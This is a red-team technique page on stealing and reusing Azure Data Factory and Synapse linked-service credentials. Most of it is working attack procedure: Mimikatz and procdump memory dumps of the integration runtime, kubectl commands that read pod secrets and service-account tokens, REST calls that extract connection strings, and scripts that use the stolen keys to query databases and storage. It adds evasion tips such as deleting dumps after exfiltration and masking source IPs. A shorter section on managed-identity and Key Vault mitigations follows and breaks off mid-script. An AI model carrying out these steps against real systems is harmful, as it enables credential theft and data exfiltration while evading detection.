# [LM-AUTH-034]: Data Factory Credential Reuse

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | LM-AUTH-034 |
| **MITRE ATT&CK v18.1** | [T1550 - Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/) |
| **Tactic** | Lateral Movement |
| **Platforms** | Entra ID, Azure Data Factory, Multi-Tenant Azure |
| **Severity** | **Critical** |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | Azure Data Factory (All versions), Azure Synapse Integration Runtime (All versions) |
| **Patched In** | N/A - Architectural limitation, mitigation through Key Vault recommended |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Azure Data Factory (ADF) and Azure Synapse pipelines store credentials for linked services (databases, storage accounts, APIs) within the service configuration. These credentials can be extracted by attackers who gain access to an ADF Integration Runtime or pipeline execution context. Once compromised, these credentials enable attackers to authenticate directly to downstream data sources (SQL databases, Cosmos DB, Event Hubs, Storage Accounts) without needing the ADF service itself, effectively bypassing the original identity context and establishing lateral movement to protected resources.

**Attack Surface:** Azure Data Factory Integration Runtimes (Self-Hosted or Managed), Azure Synapse pipelines, linked service configurations, pipeline DAG files (in Azure Data Factory's Apache Airflow integration), memory dumps of running integration runtime processes.

**Business Impact:** **Complete compromise of connected data sources.** An attacker can extract plaintext connection strings, API keys, and database passwords from ADF, then use them to directly access databases, data lakes, and event streaming services. This enables data exfiltration, malware injection into data pipelines, and lateral movement to additional resources connected through the stolen credentials.

**Technical Context:** Credential extraction typically takes 5-30 minutes of interactive access to an integration runtime environment or pipeline execution pod. Detection likelihood is **Medium** due to lack of specialized monitoring; most organizations only audit control-plane activities (Azure Resource Manager logs), not data-plane integration runtime memory or file access. The SynLapse vulnerability (CVE-2022-29972) demonstrated that attackers could gain code execution within integration runtimes through ODBC connector exploitation.

### Operational Risk
- **Execution Risk:** **High** - Requires access to integration runtime processes or ADF configuration; irreversible if credentials are leaked externally.
- **Stealth:** **High** - Memory dumps and log file access generate minimal Azure activity logs; local process inspection is not logged.
- **Reversibility:** **Partial** - Requires immediate credential rotation; attacker retains offline access to stolen credentials indefinitely.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.1.4 | Ensure that Azure Data Factory Linked Services use Managed Identity authentication instead of secrets |
| **DISA STIG** | SA-3(a) | Information System Security Plan: Credentials must be centralized in Key Vault, not embedded in pipelines |
| **CISA SCuBA** | EXO.MS.3.1 | Exchange Online: Managed identities must be used for Azure service authentication |
| **NIST 800-53** | SC-7(4), AC-3 | Logical Boundaries / Information Flow Control; Credential storage must enforce least-privilege access |
| **GDPR** | Art. 32 | Security of Processing: Technical measures to prevent unauthorized disclosure of credentials during data processing |
| **DORA** | Art. 9 | Protection and Prevention: Data protection measures including encryption and key management for financial data pipelines |
| **NIS2** | Art. 21(1)(a) | Cybersecurity Risk Management: Secure credential storage and multi-factor access to critical data infrastructure |
| **ISO 27001** | A.9.2.3, A.14.2.1 | Management of Privileged Access Rights; Secure development environment for data pipelines |
| **ISO 27005** | Section 7 | Risk Management: Credential compromise is high-probability, high-impact risk in cloud data architectures |

---

## 2. TECHNICAL PREREQUISITES

**Required Privileges:**
- **Minimum:** Read access to Azure Data Factory Integration Runtime (Self-Hosted) configuration files or process memory
- **Alternative:** Entra ID permissions: `Microsoft.DataFactory/factories/integrationRuntimes/read`, `Microsoft.DataFactory/factories/linkedServices/read`
- **Most Permissive:** Local administrator or `root` on Integration Runtime VM or container

**Required Access:**
- Network access to the Integration Runtime virtual machine or Kubernetes pod
- OR RDP/SSH access to Integration Runtime machine
- OR Code injection capability into pipeline execution context (malicious DAG file, C# Activity injection)
- OR Access to Azure Storage where integration runtime logs are stored

**Supported Versions:**
- **Azure Data Factory:** v1 (Classic) and v2 (Current) - All versions vulnerable
- **Azure Synapse Integration Runtime:** All versions
- **Operating Systems:** Windows Server 2016+, Linux (Ubuntu, CentOS)
- **PowerShell:** 5.0+ for credential enumeration
- **Azure CLI:** 2.0+ for reconnaissance

**Tools Required:**
- [Azure Storage Explorer](https://azure.microsoft.com/en-us/products/storage/storage-explorer/) or `azcopy` (credential extraction from integration runtime storage)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) (if local administrator on VM)
- [Process Dump Tools](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) (`procdump64.exe`)
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/) (credentials enumeration)
- Standard PowerShell (credential enumeration via ADF APIs)

---

## 3. ENVIRONMENTAL RECONNAISSANCE

#### Azure Portal / PowerShell Reconnaissance

```powershell
# Step 1: List all Data Factories and Integration Runtimes in current subscription
$subscriptions = Get-AzSubscription
foreach ($sub in $subscriptions) {
    Select-AzSubscription -Subscription $sub.SubscriptionId | Out-Null
    Write-Host "=== Subscription: $($sub.Name) ===" -ForegroundColor Green
    
    # List all ADF instances
    $dataFactories = Get-AzDataFactory
    foreach ($adf in $dataFactories) {
        Write-Host "Data Factory: $($adf.Name) in $($adf.ResourceGroupName)" -ForegroundColor Yellow
        
        # List Integration Runtimes
        $runtimes = Get-AzDataFactoryV2IntegrationRuntime -ResourceGroupName $adf.ResourceGroupName -DataFactoryName $adf.Name
        foreach ($runtime in $runtimes) {
            Write-Host "  - Integration Runtime: $($runtime.Name) (Type: $($runtime.Type))"
        }
    }
}

# Step 2: List all Linked Services (these contain credentials)
$adfName = "YourDataFactoryName"
$resourceGroupName = "YourResourceGroup"

$linkedServices = Get-AzDataFactoryV2LinkedService -ResourceGroupName $resourceGroupName -DataFactoryName $adfName

foreach ($linkedService in $linkedServices) {
    Write-Host "Linked Service: $($linkedService.Name)" -ForegroundColor Cyan
    # The credential details are encrypted in properties; requires factory permissions to decrypt
}

# Step 3: Check if current user has permissions to read linked services
$roleAssignments = Get-AzRoleAssignment -Scope "/subscriptions/$(Get-AzContext).Subscription.Id" | Where-Object {$_.ObjectId -eq $(Get-AzContext).Account.Id}
$roleAssignments | Select-Object RoleDefinitionName, Scope
```

**What to Look For:**
- **Self-Hosted Integration Runtimes:** Indicate on-premises connections that may expose additional credentials (SQL Server, file shares)
- **Number of Linked Services:** High count (>50) suggests extensive data pipeline connectivity
- **Linked Service Types:** Look for SQL Database, Storage Account, Cosmos DB, Event Hubs (high-value targets)
- **Azure Data Factory Reader/Contributor role:** Indicates you have permission to enumerate and potentially read linked service configurations

#### Azure CLI Reconnaissance

```bash
# Enumerate Data Factories
az datafactory list --output table

# Enumerate Integration Runtimes
az datafactory integration-runtime list --factory-name <adf-name> --resource-group <rg-name> --output table

# Check Self-Hosted IR connections (requires admin access to the IR)
az datafactory integration-runtime list-auth-keys --factory-name <adf-name> --integration-runtime-name <ir-name> --resource-group <rg-name>

# If you have Storage Blob Data Reader role on the storage account hosting IR logs:
az storage account list
az storage container list --account-name <storage-account-name>
```

**What to Look For:**
- Presence of `SelfHosted` integration runtimes (compromise entry point)
- Auth key output (if accessible) indicates authentication credentials are available
- Storage accounts associated with integration runtime logging

---

## 4. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Self-Hosted Integration Runtime Process Memory Dump (Windows)

**Supported Versions:** Azure Data Factory v1/v2 on Windows Server 2016-2025 with Self-Hosted IR

**Prerequisites:**
- Local Administrator or SYSTEM access on Self-Hosted IR VM
- Mimikatz or Process Dump tools installed

#### Step 1: Locate Self-Hosted Integration Runtime Process

**Objective:** Identify the running Integration Runtime process and its associated service account context.

**Command:**

```powershell
# Locate IR process
Get-Process | Where-Object {$_.ProcessName -match "Integration" -or $_.ProcessName -eq "diahost"}

# Detailed process inspection
Get-Process diahost -ErrorAction SilentlyContinue | Select-Object ProcessName, Id, SessionId, StartTime

# Check if running under Local System or specific service account
(Get-Process diahost -ErrorAction SilentlyContinue).ProcessName
```

**Expected Output:**
```
ProcessName: diahost
Id: 5432
SessionId: 0
StartTime: 2025-01-10 08:15:22
```

**What This Means:**
- **diahost** (Data Integration Agent) is the Integration Runtime process
- **SessionId: 0** = Running in system context (highest privilege)
- If you can identify this process, you can dump its memory

**OpSec & Evasion:**
- Process memory dumps may trigger Defender for Endpoint alerts; consider running from a clean jump box
- Use legitimate tools (`procdump64.exe`) which are whitelisted on most systems
- Dump to a non-standard location (e.g., `C:\Windows\Temp\`)
- Delete dump file after exfiltration
- Detection likelihood: **Medium** - memory dump operations are logged in Process Creation (Event ID 4688) if Detailed Audit Policy enabled

#### Step 2: Dump Process Memory

**Objective:** Extract the memory contents of the Integration Runtime process, which contain decrypted credentials.

**Command:**

```powershell
# Elevate to SYSTEM (if not already)
Start-Process -FilePath "whoami" -Wait -NoNewWindow

# Use procdump to dump the IR process memory
C:\path\to\procdump64.exe -ma -accepteula 5432 C:\Windows\Temp\diahost.dmp

# Alternative: Use Mimikatz if direct process access available
privilege::debug
token::elevate
sekurlsa::minidump C:\Windows\Temp\diahost.dmp
sekurlsa::logonpasswords
```

**Expected Output:**
```
[*] Dumping process 5432 (diahost.exe)
[*] Dump written: C:\Windows\Temp\diahost.dmp (150 MB)
```

**What This Means:**
- Memory dump contains plaintext credentials used by the Integration Runtime
- Dump file size depends on process runtime and number of active connections
- Successfully created dump = credential extraction now possible

**OpSec & Evasion:**
- Avoid WinRM or remote execution; local execution leaves less log trail
- Use `-accepteula` flag to suppress confirmation dialogs
- Clean up dump file immediately after exfiltration: `Remove-Item C:\Windows\Temp\diahost.dmp -Force`
- Detection likelihood: **High** - Process memory dumps are monitored by Defender for Endpoint

#### Step 3: Extract Credentials from Memory Dump

**Objective:** Parse the memory dump to locate plaintext credentials and connection strings.

**Command:**

```powershell
# Parse memory dump with Mimikatz
$mimiOutput = mimikatz.exe `
    'sekurlsa::minidump C:\Windows\Temp\diahost.dmp' `
    'sekurlsa::logonpasswords' `
    'exit'

# Search for specific patterns (connection strings, API keys)
$patterns = @(
    "AccountEndpoint=",  # CosmosDB
    "Endpoint=sb://",    # Event Hubs
    "DefaultEndpointsProtocol=",  # Storage Account
    "Server=",           # SQL Database
    "Password=",         # Generic database credentials
    "Bearer.*",          # OAuth tokens
    "SharedAccessKeyName="  # SAS keys
)

$mimiOutput | Select-String -Pattern ($patterns -join "|") | Out-File C:\Temp\extracted_creds.txt

# Alternative: Manual string extraction with regex
Get-Content C:\Windows\Temp\diahost.dmp -Encoding ASCII | 
    Select-String -Pattern "(?i)(accountendpoint|password=|server=|sharedaccesskey)" | 
    Out-File C:\Temp\creds_regex.txt
```

**Expected Output:**
```
CREDS:
  AccountEndpoint=https://mycosmosdb.documents.azure.com:443/;AccountKey=Eby8v...abc==;
  Server=tcp:mysqlserver.database.windows.net,1433;Database=mydb;User Id=sqladmin;Password=P@ssw0rd123!;
  DefaultEndpointsProtocol=https;AccountName=mystorageacct;AccountKey=xxxxxx/abc123...==;
  Endpoint=sb://myeventhub.servicebus.windows.net/;SharedAccessKeyName=RootManageSharedAccessKey;SharedAccessKey=xxx...
```

**What This Means:**
- Raw plaintext credentials extracted from IR memory
- These credentials are now valid for direct authentication to downstream services
- Each credential line represents a potential lateral movement path

**OpSec & Evasion:**
- Exfiltrate credential file immediately; do not leave on system
- Use encrypted channel (HTTPS, SSH) for exfiltration
- Delete source dump and extracted credential files
- Detection likelihood: **Medium** - File I/O is monitored; reading dumps from Temp directory may trigger alerts

#### Step 4: Use Stolen Credentials to Access Downstream Resources

**Objective:** Authenticate to the compromised data services using extracted credentials.

**Command (CosmosDB Access):**

```powershell
# Install Azure Cosmos DB SDK if not present
Install-Package Microsoft.Azure.Cosmos -ErrorAction SilentlyContinue

# Connect using stolen connection string
$connectionString = "AccountEndpoint=https://mycosmosdb.documents.azure.com:443/;AccountKey=Eby8v...abc==;"
$client = New-Object Microsoft.Azure.Cosmos.CosmosClient -ArgumentList $connectionString

# Enumerate databases
$databases = $client.GetDatabaseIterator()
foreach ($db in $databases) {
    Write-Host "Database: $($db.Id)"
}

# Query a database container
$database = $client.GetDatabase("YourDatabase")
$container = $database.GetContainer("YourContainer")
$items = $container.GetItemQueryIterator("SELECT * FROM c")

while ($items.HasMoreResults) {
    $page = $items.FetchNextPageAsync().Result
    foreach ($item in $page) {
        Write-Host "Item: $($item)"
    }
}
```

**Command (SQL Database Access):**

```powershell
# SQL Server Authentication using stolen credentials
$connectionString = "Server=tcp:mysqlserver.database.windows.net,1433;Database=mydb;User Id=sqladmin;Password=P@ssw0rd123!;"

$connection = New-Object System.Data.SqlClient.SqlConnection
$connection.ConnectionString = $connectionString
$connection.Open()

# Execute query
$query = "SELECT TOP 10 * FROM YourTable"
$command = New-Object System.Data.SqlClient.SqlCommand
$command.CommandText = $query
$command.Connection = $connection

$adapter = New-Object System.Data.SqlClient.SqlDataAdapter
$adapter.SelectCommand = $command
$dataSet = New-Object System.Data.DataSet
$adapter.Fill($dataSet) | Out-Null

$dataSet.Tables[0] | Format-Table
$connection.Close()
```

**Command (Storage Account Access):**

```bash
# Using azcopy with stolen storage account key
export AZURE_STORAGE_ACCOUNT="mystorageacct"
export AZURE_STORAGE_KEY="xxxxxx/abc123...=="

azcopy ls "https://${AZURE_STORAGE_ACCOUNT}.blob.core.windows.net/"
azcopy copy "https://${AZURE_STORAGE_ACCOUNT}.blob.core.windows.net/container/sensitive-data.csv" ./sensitive-data.csv

# Or use Azure Storage Explorer (GUI) with account key
```

**Expected Output:**
```
Database: MyDatabase
Container: MyContainer
Item: {"id": "1", "name": "Sensitive Data", "value": "..."}
```

**What This Means:**
- Successful authentication to downstream service
- Credentials are valid and working
- Attacker now has full access to all data accessible by the stolen credentials
- May include customer PII, financial records, proprietary analytics

**OpSec & Evasion:**
- Access through VPN or proxy to mask source IP
- Use existing corporate VPN if compromised from within trusted network
- Avoid querying entire tables; use filters to reduce log volume
- Detection likelihood: **Medium-High** - SQL queries and blob access are logged (if auditing enabled)

**Troubleshooting:**

- **Error:** "Authentication failed"
  - **Cause:** Credentials are for a specific linked service only (e.g., Azure Synapse SQL, not standalone SQL Database)
  - **Fix:** Verify credential format matches the target service (SQL vs CosmosDB vs Storage vs Event Hubs)

- **Error:** "Connection timeout"
  - **Cause:** Firewall rules on downstream service block integration runtime IP
  - **Fix:** Check if Self-Hosted IR is behind NAT; may require different IP for direct connection

**References & Proofs:**
- [Azure Data Factory Linked Services - Microsoft Learn](https://learn.microsoft.com/en-us/azure/data-factory/concepts-linked-services?tabs=data-factory)
- [Data Integration Agent (DIAHost) Process - Microsoft Documentation](https://learn.microsoft.com/en-us/azure/data-factory/concepts-integration-runtime#self-hosted-integration-runtime)
- [Secure credential management for ETL workloads - Azure Blog](https://azure.microsoft.com/en-us/blog/secure-credential-management-for-etl-workloads-using-azure-data-factory-and-azure-key-vault/)
- [SynLapse Vulnerability - Orca Security Research](https://orca.security/resources/blog/synlapse-critical-azure-synapse-analytics-service-vulnerability/)

---

### METHOD 2: Cloud-Based Integration Runtime Pod Memory Access (Kubernetes/Container)

**Supported Versions:** Azure Synapse Analytics with Managed Integration Runtime, Azure Data Factory with Apache Airflow integration

**Prerequisites:**
- Access to Kubernetes cluster where runtime is deployed
- `kubectl` CLI tool
- Container execution capability within pod

#### Step 1: Identify Integration Runtime Pods

**Objective:** Locate the Kubernetes pods running the integration runtime processes.

**Command:**

```bash
# Authenticate to Azure Kubernetes Service (AKS)
az aks get-credentials --resource-group <rg-name> --name <aks-cluster-name>

# List pods in data integration namespace
kubectl get pods -n <namespace> | grep -E "integration|airflow|spark"

# Detailed pod inspection
kubectl describe pod <pod-name> -n <namespace>

# Check pod environment variables for secrets
kubectl exec <pod-name> -n <namespace> -- env | grep -i "connection\|password\|key"
```

**Expected Output:**
```
NAME                                    READY   STATUS
integration-runtime-executor-0          1/1     Running
integration-runtime-executor-1          1/1     Running
airflow-worker-67f8c8f5cc-xyz           1/1     Running
```

**What This Means:**
- Identified integration runtime pod names and statuses
- Pods may contain plaintext credentials in environment variables or mounted secrets
- Worker pods execute data integration jobs and store temporary credentials

**OpSec & Evasion:**
- `kubectl` commands are logged if audit logging is enabled on the cluster
- Use `--v=9` flag to understand what is being logged
- Execute from within the cluster or through a legitimate service account
- Detection likelihood: **High** - Kubernetes API calls are audited by default

#### Step 2: Access Pod and Extract Credentials from Files/Memory

**Objective:** Shell into the pod and dump process memory or read configuration files containing credentials.

**Command:**

```bash
# Execute shell in pod
kubectl exec -it <pod-name> -n <namespace> -- /bin/bash

# Inside pod: List environment variables with credentials
env | grep -i "connection\|password\|secret\|key\|token"

# Inside pod: Check mounted secrets/configmaps
mount | grep secret
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Inside pod: Find and dump integration runtime process memory
ps aux | grep -E "java|python|node" | grep -v grep
# For Java processes:
jmap -dump:live,format=b,file=/tmp/heap.bin <pid>

# Inside pod: Look for credential files in common locations
find /opt /var/lib /etc -type f -name "*connection*" -o -name "*credential*" -o -name "*secret*" 2>/dev/null

# Inside pod: Check environment configuration files
cat /opt/spark/conf/spark-env.sh 2>/dev/null | grep -i password
cat /opt/airflow/airflow.cfg 2>/dev/null | grep -i password

# Inside pod: Check mounted Azure credential providers
cat /var/run/secrets/azure.com/serviceaccount/access.token 2>/dev/null
```

**Expected Output:**
```
CONNECTION_STRING=DefaultEndpointsProtocol=https;AccountName=...;AccountKey=...
COSMOS_DB_KEY=Eby8v...abc==
SPARKSQL_PASSWORD=MySecretPassword123
AIRFLOW_CONN_DATABASE=postgresql://user:pass@dbhost:5432/airflow
```

**What This Means:**
- Raw credentials visible in environment variables
- Potential access to mounted Kubernetes secrets
- Service account tokens may enable lateral movement to other pods or Kubernetes services

**OpSec & Evasion:**
- All `kubectl exec` commands are logged; use existing legitimate processes when possible
- Compress and exfiltrate credential data quickly
- Use in-memory tools (e.g., `strings` on running process) to avoid writing to disk
- Detection likelihood: **Very High** - Pod access is audited and flagged as suspicious by container security tools

#### Step 3: Extract Credentials from Pod Memory Dump

**Command:**

```bash
# Inside pod: Dump memory of running process (if tools available)
# Install memory dump tools if not present
apt-get update && apt-get install -y gdb procps 2>/dev/null || yum install -y gdb procps 2>/dev/null

# Dump Java process memory
jcmd <pid> GC.heap_dump -live /tmp/heap.bin
# Or use jmap
jmap -dump:live,format=b,file=/tmp/heap.bin <pid>

# Dump Python process memory
gdb -p <pid> -batch -ex "generate-core-file /tmp/process.core"

# Copy dump file out of pod
kubectl cp <namespace>/<pod-name>:/tmp/heap.bin ./heap.bin

# Parse heap dump locally for credentials
strings heap.bin | grep -i "password\|connectionstring\|accountkey"
```

**Expected Output:**
```
Default Endpoints Protocol = https
Account Name = mystorageaccount
Account Key = abcdef1234567890...
```

**References & Proofs:**
- [Azure Data Factory Apache Airflow Integration Security - Unit 42 Research](https://unit42.paloaltonetworks.com/azure-data-factory-apache-airflow-vulnerabilities/)
- [Kubernetes Pod Security Best Practices - Microsoft Docs](https://learn.microsoft.com/en-us/azure/aks/concepts-security)
- [jmap Command Reference - Oracle Documentation](https://docs.oracle.com/javase/8/docs/technotes/tools/unix/jmap.html)

---

### METHOD 3: Linked Service Configuration JSON Manipulation (Data Factory API)

**Supported Versions:** Azure Data Factory v2 (all versions), REST API accessible

**Prerequisites:**
- Entra ID permissions: `Microsoft.DataFactory/factories/linkedServices/read` or higher
- Azure CLI or direct REST API access
- Service principal or user account with data factory contributor permissions

#### Step 1: Enumerate Linked Services via REST API

**Objective:** List all linked services in a data factory to identify high-value targets.

**Command:**

```powershell
# Authenticate and get access token
$token = (Get-AzAccessToken -ResourceUrl "https://management.azure.com").Token

# Define API parameters
$subscriptionId = (Get-AzContext).Subscription.Id
$resourceGroupName = "your-rg"
$dataFactoryName = "your-adf"
$apiVersion = "2018-06-01"

# List all linked services
$uri = "https://management.azure.com/subscriptions/$subscriptionId/resourceGroups/$resourceGroupName/providers/Microsoft.DataFactory/factories/$dataFactoryName/linkedservices?api-version=$apiVersion"

$headers = @{
    "Authorization" = "Bearer $token"
    "Content-Type"  = "application/json"
}

$response = Invoke-RestMethod -Uri $uri -Method Get -Headers $headers
$linkedServices = $response.value

foreach ($service in $linkedServices) {
    Write-Host "Linked Service: $($service.name)"
    Write-Host "Type: $($service.properties.type)"
}
```

**Expected Output:**
```
Linked Service: SQL_Production_DB
Type: AzureSqlDatabase
Linked Service: CosmosDB_Analytics
Type: CosmosDb
Linked Service: StorageAccount_DataLake
Type: AzureBlobStorage
```

**What This Means:**
- Identified all external data sources connected to the data factory
- Each linked service contains encrypted credentials in its properties
- High-value targets: SQL Databases, CosmosDB, Event Hubs, Storage Accounts

**OpSec & Evasion:**
- API calls are logged in Azure Activity Log; normal administrative activity
- Use existing service principal rather than creating new ones
- Detection likelihood: **Low** - Linked service enumeration is legitimate admin activity

#### Step 2: Decrypt and Extract Linked Service Credentials

**Objective:** Retrieve the actual credentials from linked service properties (if accessible).

**Command:**

```powershell
# Get detailed linked service with embedded credentials
$linkedServiceUri = "https://management.azure.com/subscriptions/$subscriptionId/resourceGroups/$resourceGroupName/providers/Microsoft.DataFactory/factories/$dataFactoryName/linkedservices/SQL_Production_DB?api-version=$apiVersion"

$linkedServiceResponse = Invoke-RestMethod -Uri $linkedServiceUri -Method Get -Headers $headers

# Extract connection string (may be encrypted or require decryption)
$connectionString = $linkedServiceResponse.properties.typeProperties.connectionString
$accountKey = $linkedServiceResponse.properties.typeProperties.accountKey
$accessKey = $linkedServiceResponse.properties.typeProperties.serviceKey

Write-Host "Connection String: $connectionString"
Write-Host "Account Key: $accountKey"
Write-Host "Service Key: $accessKey"

# If properties are encrypted with integrationRuntime reference, need direct IR access to decrypt
if ($linkedServiceResponse.properties.typeProperties.encryptedCredential) {
    Write-Host "Credentials are encrypted; requires access to Integration Runtime to decrypt"
}
```

**Expected Output:**
```
Connection String: Server=tcp:mysqlserver.database.windows.net,1433;Database=mydb;User Id=sqladmin;Password=P@ssw0rd123!;
Account Key: abcdef1234567890/+/==
Service Key: eyJhbGciOiJSUzI1NiIs...
```

**What This Means:**
- Successfully extracted plaintext credentials from linked service
- Some credentials may be encrypted and require integration runtime decryption
- Attacker now has authentication material for downstream services

**Troubleshooting:**

- **Error:** "Microsoft.DataFactory/factories/linkedservices/read" permission missing
  - **Cause:** Service principal lacks sufficient permissions
  - **Fix:** Request Data Factory Contributor role: `New-AzRoleAssignment -ObjectId <spId> -RoleDefinitionName "Data Factory Contributor" -Scope /subscriptions/<subId>/resourceGroups/<rgName>`

- **Error:** Credentials are encrypted / `encryptedCredential` field present
  - **Cause:** Credentials stored in key vault or encrypted with integration runtime key
  - **Fix:** Pivot to integration runtime memory dump (Method 1) or try to access Azure Key Vault directly if permissions allow

**References & Proofs:**
- [Azure Data Factory Linked Services REST API - Microsoft Docs](https://learn.microsoft.com/en-us/rest/api/datafactory/linkedservices)
- [Azure Data Factory Security Best Practices - Microsoft Blog](https://learn.microsoft.com/en-us/azure/data-factory/data-movement-security-considerations)

---

## 5. ATTACK SIMULATION & VERIFICATION

#### Real-World Proof of Concept
The SynLapse vulnerability (CVE-2022-29972), disclosed by Orca Security in May 2022, demonstrated this attack in practice:

**Scenario:** Attacker gained code execution in Azure Synapse Integration Runtime through ODBC connector exploitation → extracted plaintext credentials to SQL databases, Cosmos DB, and storage accounts from IR memory → used stolen credentials to access other customer's data sources without using Synapse service.

**Impact:** Multi-tenant credential leakage affecting all Synapse and Data Factory customers using the affected versions.

**Reference:** [SynLapse - Orca Security Research](https://orca.security/resources/blog/synlapse-critical-azure-synapse-analytics-service-vulnerability/)

---

## 6. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Replace All Hardcoded Credentials with Azure Managed Identity**

**Applies To Versions:** Azure Data Factory v2 (all versions), Azure Synapse Analytics (all versions)

**Concept:** Instead of storing credentials in linked services, configure the data factory or synapse workspace's system-assigned managed identity and grant it RBAC permissions on target resources. The IR will authenticate transparently without handling credentials.

**Manual Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Azure Data Factory** → Select your factory
2. Click **Manage** (left menu) → **Linked Services**
3. For each linked service:
   - Click the service → **Edit**
   - Under **Authentication method**, select **Managed Identity** (if available)
   - Remove any password/key/connection string fields
   - Click **Save**
4. Verify the data factory's system-assigned managed identity:
   - Go to **Identity** (left menu under Settings)
   - Note the **Object ID** (e.g., `00000000-0000-0000-0000-000000000000`)
5. Grant the managed identity RBAC permissions on target resources:
   - **For SQL Database:** Navigate to SQL Server → **Access Control (IAM)** → **Add role assignment** → Role: `SQL DB Contributor` → Select managed identity by Object ID
   - **For Storage Account:** Navigate to Storage → **Access Control (IAM)** → **Add role assignment** → Role: `Storage Blob Data Contributor` → Select managed identity
   - **For Cosmos DB:** Navigate to Cosmos DB → **Access Control (IAM)** → **Add role assignment** → Role: `Cosmos DB Account Reader` → Select managed identity

**Manual Steps (PowerShell):**

```powershell
# Get Data Factory object ID
$adfName = "your-adf-name"
$resourceGroupName = "your-rg"
$adf = Get-AzDataFactory -Name $adfName -ResourceGroupName $resourceGroupName
$managedIdentityObjectId = $adf.Identity.PrincipalId

# Grant Managed Identity contributor access to SQL Server
$sqlServerResourceId = "/subscriptions/{subId}/resourceGroups/{rg}/providers/Microsoft.Sql/servers/{sqlServer}/databases/{database}"
New-AzRoleAssignment -ObjectId $managedIdentityObjectId -RoleDefinitionName "SQL DB Contributor" -Scope $sqlServerResourceId

# Grant Managed Identity contributor access to Storage Account
$storageResourceId = "/subscriptions/{subId}/resourceGroups/{rg}/providers/Microsoft.Storage/storageAccounts/{storageAccount}"
New-AzRoleAssignment -ObjectId $managedIdentityObjectId -RoleDefinitionName "Storage Blob Data Contributor" -Scope $storageResourceId

# Grant Managed Identity access to Cosmos DB
$cosmosResourceId = "/subscriptions/{subId}/resourceGroups/{rg}/providers/Microsoft.DocumentDB/databaseAccounts/{cosmosAccount}"
New-AzRoleAssignment -ObjectId $managedIdentityObjectId -RoleDefinitionName "Cosmos DB Account Reader" -Scope $cosmosResourceId
```

**Validation Command (Verify Fix):**

```powershell
# Check that all linked services use Managed Identity or Key Vault references
$linkedServices = Get-AzDataFactoryV2LinkedService -ResourceGroupName $resourceGroupName -DataFactoryName $adfName

foreach ($service in $linkedServices) {
    $authType = $service.Properties.typeProperties | Select-Object -ExpandProperty "*Auth*" -ErrorAction SilentlyContinue
    if ($null -eq $authType -or $authType -eq "ManagedIdentity") {
        Write-Host "$($service.Name): ✓ Using Managed Identity or Key Vault" -ForegroundColor Green
    } else {
        Write-Host "$($service.Name): ✗ Still using hardcoded credentials" -ForegroundColor Red
    }
}
```

**Expected Output (If Secure):**
```
SQL_Production_DB: ✓ Using Managed Identity
CosmosDB_Analytics: ✓ Using Managed Identity
StorageAccount_DataLake: ✓ Using Key Vault reference
```

---

**2. Enforce Azure Key Vault for All Sensitive Data (Connection Strings, API Keys)**

**Applies To Versions:** Azure Data Factory v2 (all versions), Synapse (all versions)

**Concept:** Store all credentials in Azure Key Vault, and reference them by URI in linked services. The Data Factory retrieves secrets at runtime using its managed identity, eliminating plaintext credential storage.

**Manual Steps (Azure Portal):**

1. Create or locate **Azure Key Vault**:
   - **Azure Portal** → **Key Vault** → Click **Create** (if new)
   - Name: `adf-secrets-vault`
   - Select region and resource group matching your Data Factory
   - Click **Review + Create**

2. Add secrets to Key Vault:
   - In Key Vault, click **Secrets** → **Generate/Import**
   - **Name:** `sql-connection-string` (or descriptive name)
   - **Value:** `Server=tcp:myserver.database.windows.net,1433;Database=mydb;User Id=user;Password=pass;`
   - Click **Create**
   - Repeat for all credentials (Cosmos DB, Event Hubs, etc.)

3. Grant Data Factory managed identity access to Key Vault:
   - In Key Vault, click **Access Control (IAM)** → **Add role assignment**
   - **Role:** `Key Vault Secrets User`
   - **Assign to:** Select your Data Factory by managed identity
   - Click **Save**

4. Update Linked Services to use Key Vault:
   - Go to Data Factory → **Manage** → **Linked Services**
   - Click each linked service → **Edit**
   - Under **Authentication**, select **Service Endpoint Authentication** or **Managed Identity**
   - In **Connection String** field, click the **Key Vault** button (lightning bolt icon)
   - **Key Vault Name:** Select your vault
   - **Secret Name:** Select the secret you created (e.g., `sql-connection-string`)
   - Click **Save**

**Manual Steps (PowerShell):**

```powershell
# Create Key Vault (if not exists)
$vaultName = "adf-secrets-vault"
$resourceGroupName = "your-rg"
New-AzKeyVault -Name $vaultName -ResourceGroupName $resourceGroupName -Location "eastus"

# Add secret to Key Vault
$secretName = "sql-connection-string"
$secretValue = "Server=tcp:myserver.database.windows.net,1433;Database=mydb;User Id=user;Password=pass;"
Set-AzKeyVaultSecret -VaultName $vaultName -Name $secretName -SecretValue (ConvertTo-SecureString $secretValue -AsPlainText -Force)

# Grant Data Factory managed identity access to Key Vault
$adfName = "your-adf-name"
$adf = Get-AzDataFactory -Name $adfName -ResourceGroupName $resourceGroupName
$managedIdentityObjectId = $adf.Identity.PrincipalId

$kvResourceId = "/subscriptions/$(Get-AzContext).Subscription.Id/resourceGroups/$resourceGroupName/providers/Microsoft.KeyVault/vaults/$vaultName"
New-AzRoleAssignment -ObjectId $managedIdentityObjectId -RoleDefinitionName "Key Vault Secrets User" -Scope $kvResourceId

# Create linked service that references Key Vault secret
# (This requires using ADF SDK or REST API, as Portal UI is easier for this)
```

**Validation Command (Verify Fix):**

```powershell
# Check Key Vault access by Data Factory
$vault = Get-AzKeyVault -VaultName $vaultName -ResourceGroupName $resourceGroupName
$accessPolicies = $vault.AccessPolicies

foreach ($policy in $accessPolicies) {
    Write-Host "Principal: $($policy.ObjectId)"
    Write-Host "Permissions: $($policy.PermissionsToSecrets)"
}

# Verify all linked services reference Key Vault secrets (not hardcoded)
$linkedServices = Get-AzDataFactoryV2LinkedService -ResourceGroupName $resourceGroupName -DataFactoryName $adfName
